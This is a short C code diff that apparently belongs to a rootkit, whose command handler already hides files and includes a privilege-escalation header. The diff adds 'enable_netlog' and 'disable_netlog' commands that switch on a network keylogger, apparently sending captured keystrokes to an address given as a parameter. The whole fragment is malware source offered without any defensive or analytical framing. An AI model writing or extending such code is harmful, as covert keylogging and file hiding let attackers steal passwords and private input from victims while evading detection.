@@ -4,6 +4,7 @@
 #include "control.h"
 #include "include.h"
 #include "privilege_escalation.h"
+#include "net_keylog.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -20,8 +21,17 @@ execute_command (void)
 {
 	int port;
 	pid_t pid;
-
-	if(strcmp(command_buffer, "hide_file") == 0) {
+	
+	
+	if(strcmp(command_buffer, "enable_netlog") == 0) {
+		if(param_counter > 0) {
+			enable_net_keylog(param_buffer);
+		}
+	}
+	else if(strcmp(command_buffer, "disable_netlog") == 0) {
+			disable_net_keylog();
+		}
+	else if(strcmp(command_buffer, "hide_file") == 0) {
 		if(param_counter > 0) {
 			hide_file_path(param_buffer);
 		}
